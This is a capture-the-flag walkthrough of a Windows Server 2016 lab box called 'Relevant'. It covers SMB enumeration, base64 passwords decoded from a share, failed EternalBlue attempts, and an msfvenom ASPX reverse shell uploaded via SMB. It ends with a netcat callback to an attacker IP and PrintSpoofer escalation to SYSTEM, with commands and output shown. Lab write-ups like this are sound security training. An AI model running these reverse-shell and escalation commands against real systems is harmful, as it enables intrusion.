# Relevant (SMB and PrintSpoofer)

### **Relevant** <a href="#lve39wh4cq6s" id="lve39wh4cq6s"></a>

* Client wants penetration test conducted on environment due to be released into production in 7 days.

### **Pre-Engagement Briefing** <a href="#d9tziu6p5fnw" id="d9tziu6p5fnw"></a>

#### **Scope of Work** <a href="#j6bcqwppgk5s" id="j6bcqwppgk5s"></a>

* Conduct assessment of provided virtual environment.
* Minimal information provided as engagement should be conducted from the eyes of malicious actor - black box test.
* Secure 2 flags as proof of exploitation - user.txt, root.txt.

**Scope allowances**

* Any tools or techniques are permitted but attempt manual exploitation first.
* Locate and note all vulnerabilities found - there is more than one path to root.
* Submit discovered flags to dashboard.
* Only IP address assigned to attack host is in scope.
* No need to use Metasploit.

### **Nmap scan of target host ((Reconnaissance: Active Scanning: Vulnerability Scanning (T1595.002)))** <a href="#id-133zimkf01vk" id="id-133zimkf01vk"></a>

nmap -pN -p- -sV -sC -oN TARGET\_IP\_scan.nmap TARGET\_IP

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-06 09:50 GMT

Stats: 0:01:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan

Service scan Timing: About 0.00% done

Stats: 0:01:44 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan

Service scan Timing: About 75.00% done; ETC: 09:52 (0:00:15 remaining)

Nmap scan report for 10.10.64.106

Host is up (0.031s latency).

Not shown: 65527 filtered tcp ports (no-response)

PORT STATE SERVICE VERSION

80/tcp open http Microsoft IIS httpd 10.0

|\_http-server-header: Microsoft-IIS/10.0

|\_http-title: IIS Windows Server

\| http-methods:

|\_ Potentially risky methods: TRACE

135/tcp open msrpc Microsoft Windows RPC

139/tcp open netbios-ssn Microsoft Windows netbios-ssn

445/tcp open microsoft-ds Windows Server 2016 Standard Evaluation 14393 microsoft-ds

3389/tcp open ms-wbt-server Microsoft Terminal Services

\| ssl-cert: Subject: commonName=Relevant

\| Not valid before: 2024-03-05T09:48:40

|\_Not valid after: 2024-09-04T09:48:40

|\_ssl-date: 2024-03-06T09:53:03+00:00; +15s from scanner time.

\| rdp-ntlm-info:

\| Target\_Name: RELEVANT

\| NetBIOS\_Domain\_Name: RELEVANT

\| NetBIOS\_Computer\_Name: RELEVANT

\| DNS\_Domain\_Name: Relevant

\| DNS\_Computer\_Name: Relevant

\| Product\_Version: 10.0.14393

|\_ System\_Time: 2024-03-06T09:52:22+00:00

49663/tcp open http Microsoft IIS httpd 10.0

|\_http-title: IIS Windows Server

|\_http-server-header: Microsoft-IIS/10.0

\| http-methods:

|\_ Potentially risky methods: TRACE

49667/tcp open msrpc Microsoft Windows RPC

49669/tcp open msrpc Microsoft Windows RPC

Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:

\| smb2-security-mode:

\| 3:1:1:

|\_ Message signing enabled but not required

|\_clock-skew: mean: 1h36m15s, deviation: 3h34m42s, median: 14s

\| smb-security-mode:

\| account\_used: guest

\| authentication\_level: user

\| challenge\_response: supported

|\_ message\_signing: disabled (dangerous, but default)

\| smb2-time:

\| date: 2024-03-06T09:52:26

|\_ start\_date: 2024-03-06T09:48:58

\| smb-os-discovery:

\| OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)

\| Computer name: Relevant

\| NetBIOS computer name: RELEVANT\x00

\| Workgroup: WORKGROUP\x00

|\_ System time: 2024-03-06T01:52:27-08:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 156.11 seconds

### **Nmap vuln script scan against open ports ((Reconnaissance: Active Scanning: Vulnerability Scanning (T1595.002)))** <a href="#s5cibw2nqvw0" id="s5cibw2nqvw0"></a>

nmap -Pn -p80,135,139,445,3389,49663,49667,49559 -sV --script=vuln -oN TARGET\_IP\_vuln\_scan.nmap TARGET\_IP

PORT STATE SERVICE VERSION

80/tcp open http Microsoft IIS httpd 10.0

|\_http-csrf: Couldn't find any CSRF vulnerabilities.

|\_http-dombased-xss: Couldn't find any DOM based XSS.

|\_http-server-header: Microsoft-IIS/10.0

|\_http-stored-xss: Couldn't find any stored XSS vulnerabilities.

135/tcp open msrpc Microsoft Windows RPC

139/tcp open netbios-ssn Microsoft Windows netbios-ssn

445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds

3389/tcp open ms-wbt-server Microsoft Terminal Services

49559/tcp filtered unknown

49663/tcp open http Microsoft IIS httpd 10.0

|\_http-stored-xss: Couldn't find any stored XSS vulnerabilities.

|\_http-csrf: Couldn't find any CSRF vulnerabilities.

|\_http-server-header: Microsoft-IIS/10.0

|\_http-dombased-xss: Couldn't find any DOM based XSS.

49667/tcp open msrpc Microsoft Windows RPC

Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:

|\_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)

|\_smb-vuln-ms10-054: false

\| smb-vuln-ms17-010:

\| VULNERABLE:

\| Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)

\| State: VULNERABLE

\| IDs: CVE:CVE-2017-0143

\| Risk factor: HIGH

\| A critical remote code execution vulnerability exists in Microsoft SMBv1

\| servers (ms17-010).

|

\| Disclosure date: 2017-03-14

\| References:

\| https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

\| https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

|\_ https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 224.94 seconds

### **80/tcp** <a href="#a5mzchj01cy2" id="a5mzchj01cy2"></a>

#### **Browse to webserver ()** <a href="#v5lxa5k5bs12" id="v5lxa5k5bs12"></a>

* Displays IIS welcome page - Misconfiguration-based vulnerability.

#### **Detect hidden directories using GoBuster (Reconnaissance: Wordlist Scanning (T1595.003))** <a href="#kmp2b67zqa6d" id="kmp2b67zqa6d"></a>

gobuster dir --url http://10.10.64.106 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt > gobuster80.txt

* No directories found.

#### **Search for exploitable vulnerabilites affecting IIS 10.0 ()** <a href="#pw4vroemjsu9" id="pw4vroemjsu9"></a>

* Nothing listed on[ Exploit database](https://www.exploit-db.com/).

### **135/tcp, 139/tcp, 445/tcp** <a href="#nfv6908aoayl" id="nfv6908aoayl"></a>

#### **Enumerate target host for SMB Shares ()** <a href="#z2o935sq3x62" id="z2o935sq3x62"></a>

nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse -oN TARGET\_IP\_smb\_scan.nmap TARGET\_IP

PORT STATE SERVICE

445/tcp open microsoft-ds

Host script results:

\| smb-enum-shares:

\| account\_used: guest

\| \\\10.10.64.106\ADMIN$:

\| Type: STYPE\_DISKTREE\_HIDDEN

\| Comment: Remote Admin

\| Anonymous access: \<none>

\| Current user access: \<none>

\| \\\10.10.64.106\C$:

\| Type: STYPE\_DISKTREE\_HIDDEN

\| Comment: Default share

\| Anonymous access: \<none>

\| Current user access: \<none>

\| \\\10.10.64.106\IPC$:

\| Type: STYPE\_IPC\_HIDDEN

\| Comment: Remote IPC

\| Anonymous access: \<none>

\| Current user access: READ/WRITE

\| \\\10.10.64.106\nt4wrksv:

\| Type: STYPE\_DISKTREE

\| Comment:

\| Anonymous access: \<none>

|\_ Current user access: READ/WRITE

Nmap done: 1 IP address (1 host up) scanned in 32.57 seconds

#### **Inspect \nt4wrksv share ()** <a href="#id-80npcz0na9j" id="id-80npcz0na9j"></a>

smbclient //TARGET\_IP/nt4wrksv

Password for \[WORKGROUP\kali]:

Try "help" to get a list of possible commands.

smb: \\> dir

. D 0 Wed Mar 6 10:12:18 2024

.. D 0 Wed Mar 6 10:12:18 2024

passwords.txt A 98 Sat Jul 25 16:15:33 2020

7735807 blocks of size 4096. 5137052 blocks available

#### **Attempt to recursively download \nt4wrksv share ()** <a href="#sdtejxib7but" id="sdtejxib7but"></a>

* Submit username and password as nothing.

smbget -R smb://TARGET\_IP/nt4wrksv

handle\_name\_resolve\_order: WARNING: Ignoring invalid list value 'smb://10.10.64.106/nt4wrksv' for parameter 'name resolve order'

Downloaded 0b in 0 seconds

#### **Download "passwords.txt" from \nt4wrksv share ()** <a href="#u2yb1eoh52pz" id="u2yb1eoh52pz"></a>

smbclient //TARGET\_IP/nt4wrksv

get passwords.txt

getting file \passwords.txt of size 98 as passwords.txt (0.8 KiloBytes/sec) (average 0.8 KiloBytes/sec)

* Contents of "passwords.txt".

\[User Passwords - Encoded]

Qm9iIC0gIVBAJCRXMHJEITEyMw==

QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk

[**How to check whether a string is Base64 encoded or not**](https://stackoverflow.com/questions/8571501/how-to-check-whether-a-string-is-base64-encoded-or-not). Check that the length is a multiple of 4 characters. Check that every character is in the set A-Z, a-z, 0-9, +, / except for padding at the end which is 0, 1 or 2 '=' characters.

#### **Decode passwords into plaintext ()** <a href="#jecravc7e6" id="jecravc7e6"></a>

echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d

Bob - !P@\$$W0rD!123

echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d

Bill - Juw4nnaM4n420696969!\$$$

#### **Inspect \IPC$ share ()** <a href="#id-3dnq2corb05w" id="id-3dnq2corb05w"></a>

smbclient //TARGET\_IP/IPC$

Password for \[WORKGROUP\kali]:

Try "help" to get a list of possible commands.

smb: \\> dir

NT\_STATUS\_NO\_SUCH\_FILE listing \\\*

#### **Attempt to exploit Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) ()** <a href="#p4pgn62ywmb5" id="p4pgn62ywmb5"></a>

* Nmap detected that Samba server is probably vulnerable to RCE due to[ CVE-2017-0143](https://nvd.nist.gov/vuln/detail/cve-2017-0143).

The SMBv1 server in Microsoft Windows Vista SP2; Windows Server 2008 SP2 and R2 SP1; Windows 7 SP1; Windows 8.1; Windows Server 2012 Gold and R2; Windows RT 8.1; and Windows 10 Gold, 1511, and 1607; and Windows Server 2016 allows remote attackers to execute arbitrary code via crafted packets, aka "Windows SMB Remote Code Execution Vulnerability." This vulnerability is different from those described in CVE-2017-0144, CVE-2017-0145, CVE-2017-0146, and CVE-2017-0148. **Search searchsploit for EternalBlue exploit**

searchsploit eternalblue

\------------------------------------------ ---------------------------------

Exploit Title | Path

\------------------------------------------ ---------------------------------

Microsoft Windows 7/2008 R2 - 'EternalBlu | windows/remote/42031.py

Microsoft Windows 7/8.1/2008 R2/2012 R2/2 | windows/remote/42315.py

Microsoft Windows 8/8.1/2012 R2 (x64) - ' | windows\_x86-64/remote/42030.py

\------------------------------------------ ---------------------------------

Shellcodes: No Results

* Use "42315.py" as this exploit explicitly states Windows 2016 is valid target.

searchsploit -m 42315

Exploit: Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternaMB Remote Code Execution (MS17-010)

URL: https://www.exploit-db.com/exploits/42315

Path: /usr/share/exploitdb/exploits/windows/remote/42315.py

Codes: CVE-2017-0144

Verified: True

File Type: Python script, ASCII text executable

Copied to: /home/kali/42315.py

* Copy exploit to working directory.

cp /usr/share/exploitdb/exploits/windows/remote/42315.py ./exploit.py

* Exploit requires "mysmb.py" module to be in same directory.

wget https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py

* Change exploit's USERNAME and PASSWORD variables to one of the credentials identified in "passwords.txt".
* Execute exploit using IP address of target host.

python exploit.py TARGET\_IP

* Exploit errored out using either set of credentials.

Target OS: Windows Server 2016 Standard Evaluation 14393

Using named pipe: samr

Traceback (most recent call last):

File "/home/kali/Desktop/Relevant/42315/exploit.py", line 998, in \<module>

exploit(target, pipe\_name)

File "/home/kali/Desktop/Relevant/42315/exploit.py", line 834, in exploit

if not info\['method']\(conn, pipe\_name, info):

^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

File "/home/kali/Desktop/Relevant/42315/exploit.py", line 489, in exploit\_matched\_pairs

info.update(leak\_frag\_size(conn, tid, fid))

^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

File "/home/kali/Desktop/Relevant/42315/exploit.py", line 333, in leak\_frag\_size

req1 = conn.create\_nt\_trans\_packet(5, param=pack('\<HH', fid, 0), mid=mid, data='A'\*0x10d0, maxParameterCount=GROOM\_TRANS\_SIZE-0x10d0-TRANS\_NAME\_LEN)

^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

File "/home/kali/Desktop/Relevant/42315/mysmb.py", line 349, in create\_nt\_trans\_packet

\_put\_trans\_data(transCmd, param, data, noPad)

File "/home/kali/Desktop/Relevant/42315/mysmb.py", line 73, in \_put\_trans\_data

transData = ('\x00' \* padLen) + parameters

\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~^\~\~\~\~\~\~\~\~\~\~\~

TypeError: can only concatenate str (not "bytes") to str

* Error is due to[ Python 3 cannot concatenate bytes and strings, so use python2 and it should work](https://github.com/worawit/MS17-010/issues/48).
* [AutoBlue-MS17-010](https://github.com/3ndG4me/AutoBlue-MS17-010) supports Python 3.
* Clone Git repository.

git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git

* Install any requirements.

cd AutoBlue-MS17-010

pip install -r requirements.txt

* Run "zzz\_exploit.py" using credentials identified in "passwords.txt".

python zzz\_exploit.py username:'password'@TARGET\_IP

* Script errors out due as "The attempted logon is invalid. This is either due to a bad username or authentication information".

Traceback (most recent call last):

File "/home/kali/Desktop/Relevant/AutoBlue-MS17-010/zzz\_exploit.py", line 1112, in \<module>

main()

File "/home/kali/Desktop/Relevant/AutoBlue-MS17-010/zzz\_exploit.py", line 1109, in main

exploit(options.target\_ip, int(options.port), username, password, options.pipe, options.share, options.mode)

File "/home/kali/Desktop/Relevant/AutoBlue-MS17-010/zzz\_exploit.py", line 942, in exploit

conn.login(username, password, maxBufferSize=4356)

File "/home/kali/Desktop/Relevant/AutoBlue-MS17-010/mysmb.py", line 188, in login

smb.SMB.login(self, user, password, domain, lmhash, nthash)

File "/usr/local/lib/python3.11/dist-packages/impacket/smb.py", line 3512, in login

self.login\_standard(user, password, domain, lmhash, nthash)

File "/home/kali/Desktop/Relevant/AutoBlue-MS17-010/mysmb.py", line 192, in login\_standard

smb.SMB.login\_standard(self, user, password, domain, lmhash, nthash)

File "/usr/local/lib/python3.11/dist-packages/impacket/smb.py", line 3568, in login\_standard

if smb.isValidAnswer(SMB.SMB\_COM\_SESSION\_SETUP\_ANDX):

^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

File "/usr/local/lib/python3.11/dist-packages/impacket/smb.py", line 786, in isValidAnswer

raise SessionError("SMB Library Error", self\['ErrorClass'] + (self\['\_reserved'] << 8), self\['ErrorCode'], self\['Flags2'] & SMB.FLAGS2\_NT\_STATUS, self)

impacket.smb.SessionError: SMB SessionError: code: 0xc000006d - STATUS\_LOGON\_FAILURE - The attempted logon is invalid. This is either due to a bad username or authentication information.

### **3389/tcp** <a href="#iu3mbuj9dvzx" id="iu3mbuj9dvzx"></a>

#### **Attempt to RDP to target host using credentials found in "passwords.txt" ()** <a href="#gwnqw67artov" id="gwnqw67artov"></a>

xfreerdp /v:TARGET\_IP /u:bill /p:'Juw4nnaM4n420696969!\$$$'

\[11:14:41:070] \[87555:87556] \[ERROR]\[com.freerdp.core] - freerdp\_tcp\_connect:freerdp\_set\_last\_error\_ex ERRCONNECT\_CONNECT\_FAILED \[0x00020006]

\[11:14:41:071] \[87555:87556] \[ERROR]\[com.freerdp.core] - failed to connect to 10.10.64.106

xfreerdp /v:TARGET\_IP /u:bob /p:'!P@\$$W0rD!123'

\[11:17:04:916] \[88758:88759] \[ERROR]\[com.freerdp.core] - freerdp\_tcp\_connect:freerdp\_set\_last\_error\_ex ERRCONNECT\_CONNECT\_FAILED \[0x00020006]

\[11:17:04:916] \[88758:88759] \[ERROR]\[com.freerdp.core] - failed to connect to 10.10.64.106

### **49663/tcp** <a href="#p5zw09d4riud" id="p5zw09d4riud"></a>

#### **Browse to webserver ()** <a href="#h9zaqld1hr8t" id="h9zaqld1hr8t"></a>

* Displays IIS welcome page - Misconfiguration-based vulnerability.

#### **Detect hidden directories using GoBuster (Reconnaissance: Wordlist Scanning (T1595.003))** <a href="#id-89bpsener4u" id="id-89bpsener4u"></a>

gobuster dir --url http://10.10.64.106:49663 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt > gobuster49663.txt

\[...snip...]

/nt4wrksv (Status: 301) \[Size: 158] \[--> http://10.10.103.82:49663/nt4wrksv/]

\[...snip...]

#### **Browse to /nt4wrksv directory ()** <a href="#id-1olsr4tzw9dl" id="id-1olsr4tzw9dl"></a>

* Displays black screen.
* No source code.

#### **nt4wrksv is same directory name identified during SMB enumeration ()** <a href="#id-44la5ytrsa2a" id="id-44la5ytrsa2a"></a>

* Add "passwords.txt" to end of URL.
* Content displayed in browser and downloadable via wget - must be same directory.

![image](<../.gitbook/assets/0 (3).png>)

wget http://10.10.245.215:49663/nt4wrksv/passwords.txt

\--2024-03-07 09:20:09-- http://10.10.245.215:49663/nt4wrksv/passwords.txt

Connecting to 10.10.245.215:49663... connected.

HTTP request sent, awaiting response... 200 OK

Length: 98 \[text/plain]

Saving to: ‘passwords.txt’

passwords.txt 100%\[==================================================================================>] 98 --.-KB/s in 0s

2024-03-07 09:20:09 (30.3 MB/s) - ‘passwords.txt’ saved \[98/98]

#### **Exploit file upload feature ()** <a href="#xv0jx6tawhh6" id="xv0jx6tawhh6"></a>

[**PHP and ASP.net are application frameworks are used by IIS**](https://learn.microsoft.com/en-us/iis/application-frameworks/scenario-build-an-aspnet-website-on-iis/configuring-step-1-install-iis-and-asp-net-modules). **Upload test .php file to /nt4wrksv via SMB**

smbclient //10.10.245.215/nt4wrksv

Password for \[WORKGROUP\kali]:

Try "help" to get a list of possible commands.

smb: \\> put php-reverse-shell.php

putting file php-reverse-shell.php as \php-reverse-shell.php (56.4 kb/s) (average 56.4 kb/s)

**Attempt to download .php file using wget - filtering is in place :(**

wget http://TARGET\_IP:49663/nt4wrksv/php-reverse-shell.php

\--2024-03-07 09:20:20-- http://10.10.245.215:49663/nt4wrksv/php-reverse-shell.php

Connecting to 10.10.245.215:49663... connected.

HTTP request sent, awaiting response... 404 Not Found

2024-03-07 09:20:20 ERROR 404: Not Found.

[.aspx - an ASP.NET Web forms file (page) that can contain Web controls and presentation and business logic](https://learn.microsoft.com/en-us/previous-versions/aspnet/2wawkw1c\(v=vs.100\)#file-types-managed-by-aspnet). **Upload test .aspx file to /nt4wrksv via SMB**

touch test.aspx

smbclient //TARGET\_IP/nt4wrksv

Password for \[WORKGROUP\kali]:

Try "help" to get a list of possible commands.

smb: \\> put test.aspx

putting file test.aspx as \test.aspx (0.0 kb/s) (average 0.0 kb/s)

**Attempt to download .aspx file using wget - success!**

wget http://TARGET\_IP:49663/nt4wrksv/test.aspx

\--2024-03-07 09:48:57-- http://10.10.245.215:49663/nt4wrksv/test.aspx

Connecting to 10.10.245.215:49663... connected.

HTTP request sent, awaiting response... 200 OK

Length: 0 \[text/html]

Saving to: ‘test.aspx’

test.aspx \[ <=> ] 0 --.-KB/s in 0s

2024-03-07 09:49:07 (0.00 B/s) - ‘test.aspx’ saved \[0/0]

#### [**Create .aspx reverse shell payload in "msfvenom"**](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom#asp-x) **()** <a href="#tcuz06r6h7t7" id="tcuz06r6h7t7"></a>

msfvenom -p windows/x64/shell\_reverse\_tcp LHOST=(Attacker IP Address) LPORT=53 -f aspx > reverse.aspx

**Upload reverse shell to target host via SMB**

smbclient //TARGET\_IP/nt4wrksv

Password for \[WORKGROUP\kali]:

Try "help" to get a list of possible commands.

smb: \\> put reverse.aspx

putting file reverse.aspx as \reverse.aspx (25.6 kb/s) (average 25.6 kb/s)

**Create listener on attack host**

nc -lvnp 53

**Execute reverse shell**

curl http://TARGET\_IP:49663/nt4wrksv/reverse.aspx

**Verify reverse shell caught by listener**

connect to \[ATTACKER\_IP] from (UNKNOWN) \[TARGET\_IP] 49870

Microsoft Windows \[Version 10.0.14393]

(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami

whoami

iis apppool\defaultapppool

**Find user flag**

dir "user.txt" /s

Volume in drive C has no label.

Volume Serial Number is AC3C-5CB5

Directory of c:\Users\Bob\Desktop

07/25/2020 07:24 AM 35 user.txt

1 File(s) 35 bytes

\[...snip...]

#### **Look for credentials in "web.config" file ()** <a href="#by4hm3mok7dx" id="by4hm3mok7dx"></a>

type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

* Nothing found.

#### **Look for scheduled tasks that either lost its binary or is using a binary that can be modified ()** <a href="#kbjo6ftcq9cp" id="kbjo6ftcq9cp"></a>

schtasks /query /fo list /v > schtasks.txt

* Nothing found.

#### **Attempt to Backup SAM and SYSTEM hashes ()** <a href="#ei8q4jkrcq7f" id="ei8q4jkrcq7f"></a>

cd c:\inetpub\wwwroot

reg save hklm\system c:\inetpub\wwwroot\system.hive

ERROR: Access is denied.

reg save hklm\sam c:\inetpub\wwwroot\sam.hive

ERROR: Access is denied.

#### **Determine privileges assigned to current account ()** <a href="#saptvu6owteo" id="saptvu6owteo"></a>

whoami /priv

PRIVILEGES INFORMATION

\----------------------

Privilege Name Description State

\============================= ========================================= ========

SeAssignPrimaryTokenPrivilege Replace a process level token Disabled

SeIncreaseQuotaPrivilege Adjust memory quotas for a process Disabled

SeAuditPrivilege Generate security audits Disabled

SeChangeNotifyPrivilege Bypass traverse checking Enabled

SeImpersonatePrivilege Impersonate a client after authentication Enabled

SeCreateGlobalPrivilege Create global objects Enabled

SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

**SeImpersonatePrivilege**. Any process holding this privilege can impersonate (but not create) any token for which it is able to gethandle. You can get a privileged token from a Windows service (DCOM) making it perform an NTLM authentication against the exploit, then execute a process as SYSTEM. Exploit it with[ Juicy Potato](https://github.com/ohpe/juicy-potato),[ RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (needs winrm disabled),[ Sweet Potato](https://github.com/CCob/SweetPotato),[ PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

#### **Attempt privilege escalation using**[ **RogueWinRM**](https://github.com/antonioCoco/RogueWinRM) **()** <a href="#nrhh1efqi8ed" id="nrhh1efqi8ed"></a>

* Clone Git respository.

wget https://github.com/antonioCoco/RogueWinRM/releases/download/1.1/RogueWinRM.zip

unzip RogueWinRM.zip

**Download Windows netcat**

wget https://github.com/int0x33/nc.exe/blob/master/nc64.exe

**Upload files to target host via SMB**

smbclient //10.10.91.212/nt4wrksv

Password for \[WORKGROUP\kali]:

Try "help" to get a list of possible commands.

smb: \\> put RogueWinRM.exe

smb: \\> put nc64.exe

**Create listener and execute exploit on target host**

roguewinrm.exe -p "nc64.exe" -a "-e cmd.exe 10.11.72.190 4442"

Listening for connection on port 5985 ....

Error: WinRM already running on port 5985. Unexploitable!

bind failed with error: 10013

netstat -ano | findstr 5985

TCP 0.0.0.0:5985 0.0.0.0:0 LISTENING 4

### **Attempt privilege escalation using**[ **PrintSpoofer**](https://github.com/itm4n/PrintSpoofer) **()** <a href="#id-3tv5c2e67qwh" id="id-3tv5c2e67qwh"></a>

**Download binary to attack host**

wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe

**Upload binary to target host using SMB**

mbclient //TARGET\_IP/nt4wrksv

Password for \[WORKGROUP\kali]:

Try "help" to get a list of possible commands.

smb: \\> put PrintSpoofer64.exe

putting file PrintSpoofer64.exe as \PrintSpoofer64.exe (112.8 kb/s) (average 112.8 kb/s)

**Run exploit on target host**

cd c:/inetpub/wwwroot

printspoofer64.exe -i -c cmd

\[+] Found privilege: SeImpersonatePrivilege

\[+] Named pipe listening...

\[+] CreateProcessAsUser() OK

Microsoft Windows \[Version 10.0.14393]

(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami

whoami

nt authority\system

**Find root flag**

dir "root.txt" /s

\[...snip...]

Directory of C:\Users\Administrator\Desktop

07/25/2020 07:25 AM 35 root.txt

1 File(s) 35 bytes

\[...snip...]

### **49667/tcp** <a href="#y36ufs66zogk" id="y36ufs66zogk"></a>

* Not checked.

### **49669/tcp** <a href="#eeknf3i6ig5" id="eeknf3i6ig5"></a>

* Not checked.
